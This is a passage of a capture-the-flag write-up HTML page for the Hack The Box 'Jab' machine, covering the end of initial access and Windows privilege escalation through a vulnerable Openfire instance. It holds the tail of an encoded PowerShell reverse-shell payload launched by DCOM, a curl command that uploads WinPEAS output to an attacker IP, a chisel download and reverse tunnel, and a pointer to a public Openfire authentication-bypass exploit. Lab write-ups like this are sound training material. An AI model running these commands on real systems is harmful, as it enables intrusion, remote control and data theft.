AA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=' -nooutput -object MMC20 -dc-ip 10.10.11.4</code></pre><p>Found user flag → <mark class="highlight-teal" data-notion-highlight="teal"><strong>27a1aafa2ee3bf8b37058808f6365f03</strong></mark></p></li></ol>
+
+<h2>Priv escalation</h2>
+
+<h3>WinPeas</h3>
+
+<pre><code>&amp; "C:\users\svc_openfire\Desktop\wp.exe" | Out-File -FilePath "C:\users\svc_openfire\Desktop\out.txt"
+curl.exe -X POST -F "file=@out.txt" http://10.10.14.2:88/upload</code></pre>
+
+<details>
+<summary>output</summary>
+<div class="inner">
+<pre><code>UAC
+LocalAccountTokenFilterPolicy:
+FilterAdministratorToken:
+[*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
+[-] Only the RID-500 local admin account can be used for lateral movement.
+
+╔══════════╣ Enumerating Named Pipes
+  Name                                                                                                 CurrentUserPerms
+                                  Sddl
+
+  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
+
+  ROUTER                                                                                               Everyone [WriteData/CreateFiles]                                       O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)
+
+  RpcProxy\49674                                                                                       Everyone [WriteData/CreateFiles]                                       O:BAG:SYD:(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;BA)
+
+  RpcProxy\593                                                                                         Everyone [WriteData/CreateFiles]                                       O:NSG:NSD:(A;;0x12019b;;;WD)(A;;RC;;;OW)(A;;0x12019b;;;AN)(A;;FA;;;S-1-5-80-521322694-906040134-3864710659-1525148216-3451224162)(A;;FA;;;S-1-5-80-979556362-403687129-3954533659-2335141334-1547273080)
+
+  vgauth-service
+
+╔══════════╣ Current Token privileges
+╚ Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation
+    SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED                                                                                     Everyone [WriteData/CreateFiles]                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
+
+
+
+
+     Enumerating IPv6 connections
+
+  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name
+
+  TCP        [::]                                        88            [::]                                        0               Listening         640             lsass
+  TCP        [::]                                        135           [::]                                        0               Listening         896             svchost
+  TCP        [::]                                        445           [::]                                        0               Listening         4               System
+  TCP        [::]                                        464           [::]                                        0               Listening         640             lsass
+  TCP        [::]                                        593           [::]                                        0               Listening         896             svchost
+  TCP        [::]                                        5222          [::]                                        0               Listening         3116            openfire-service
+  TCP        [::]                                        5223          [::]                                        0               Listening         3116            openfire-service
+  TCP        [::]                                        5262          [::]                                        0               Listening         3116            openfire-service
+  TCP        [::]                                        5263          [::]                                        0               Listening         3116            openfire-service
+  TCP        [::]                                        5269          [::]                                        0               Listening         3116            openfire-service
+  TCP        [::]                                        5270          [::]                                        0               Listening         3116            openfire-service
+  TCP        [::]                                        5275          [::]                                        0               Listening         3116            openfire-service
+  TCP        [::]                                        5276          [::]                                        0               Listening         3116            openfire-service
+  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
+  TCP        [::]                                        7070          [::]                                        0               Listening         3116            openfire-service
+  TCP        [::]                                        7443          [::]                                        0               Listening         3116            openfire-service
+  TCP        [::]                                        7777          [::]                                        0               Listening         3116            openfire-service
+  TCP        [::]                                        9389          [::]                                        0               Listening         2504            Microsoft.ActiveDirectory.WebServices
+  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
+  TCP        [::]                                        49664         [::]                                        0               Listening         480             wininit
+  TCP        [::]                                        49665         [::]                                        0               Listening         1200            svchost
+  TCP        [::]                                        49666         [::]                                        0               Listening         1460            svchost
+  TCP        [::]                                        49667         [::]                                        0               Listening         640             lsass
+  TCP        [::]                                        49671         [::]                                        0               Listening         1572            svchost
+  TCP        [::]                                        49674         [::]                                        0               Listening         640             lsass
+  TCP        [::]                                        49675         [::]                                        0               Listening         640             lsass
+  TCP        [::]                                        49676         [::]                                        0               Listening         640             lsass
+  TCP        [::]                                        49681         [::]                                        0               Listening         620             services
+  TCP        [::]                                        49777         [::]                                        0               Listening         2640            dns
+  TCP        [::]                                        51023         [::]                                        0               Listening         2632            dfsrs
+  TCP        [::]                                        51041         [::]                                        0               Listening         1956            C:\Windows\system32\mmc.exe
+  TCP        [::1]                                       53            [::]                                        0               Listening         2640            dns
+  TCP        [::1]                                       49667         [::1]                                       51018           Established       640             lsass
+  TCP        [::1]                                       49667         [::1]                                       51071           Established       640             lsass
+  TCP        [::1]                                       51018         [::1]                                       49667           Established       2632            dfsrs
+  TCP        [::1]                                       51071         [::1]                                       49667           Established       640             lsass</code></pre>
+</div>
+</details>
+
+<h3>Openfire</h3>
+
+<ol><li>List all local ports <code>netstat -ano | findstr '127.0.0.1:'</code><pre><code>TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2640
+TCP    127.0.0.1:389          127.0.0.1:49774        ESTABLISHED     640
+TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3116
+TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3116
+TCP    127.0.0.1:49691        127.0.0.1:49692        ESTABLISHED     3116</code></pre></li><li>9090 and 9091 seem interesting, lets try to forward them
+
+<pre><code># Upload to victim
+curl http://10.10.16.7:88/chisel.exe -o chisel.exe
+
+# Kali
+./chisel_arm server -p 9999 --reverse
+
+# Victim
+.\chisel.exe client 10.10.16.7:9999 R:9090:127.0.0.1:9090</code></pre>
+
+</li><li>We can access it on <a href="http://localhost:9090">localhost:9090</a><figure><img src="../assets/images/htb/jab/04-untitled-3.png" alt=""></figure><blockquote>Note: the version is 4.7.5</blockquote></li><li>This version has several CVE’s related to priv escalation<figure><p><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-9209/product_id-16308/Igniterealtime-Openfire.html" target="_blank" rel="noopener noreferrer">Igniterealtime Openfire : Security vulnerabilities, CVEs</a> - Security vulnerabilities of Igniterealtime Openfire : List of vulnerabilities affecting any version of this product</p></figure><figure><p><a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass" target="_blank" rel="noopener noreferrer">tangxiaofeng7/CVE-2023-32315-Openfire-Bypass</a></p></figure></li><li>Upload the jar file, follow the steps in the github repo, we get RCE as system and an ability to browse the filesystem. Everything is in chinese however 😀<figure><img src="../assets/images/htb/jab/05-0d3f8578-c780-4636-8e8e-6d02fd248ce4.png" alt=""></figure><figure><img src="../assets/images/htb/jab/06-untitled-4.png" alt=""></figure></li></ol>
+                </article>
+
+                <aside class="toc">
+                    <p class="toc-k">Contents</p>
+                    <ul id="toc-list"></ul>
+                </aside>
+            </div>
+        </main>
+
+        <footer class="site-foot">
+            <div class="foot-in">
+                <p class="copy">© <span data-year></span> Frédéric Goossens · <span class="credit">vibe coded</span></p>
+                <div class="socials">
+                    <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+                    <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="scroll-hint" data-scroll-hint aria-hidden="true"></div>
+    <script src="../assets/js/site.js?v=66"></script>
+</body>
+</html>
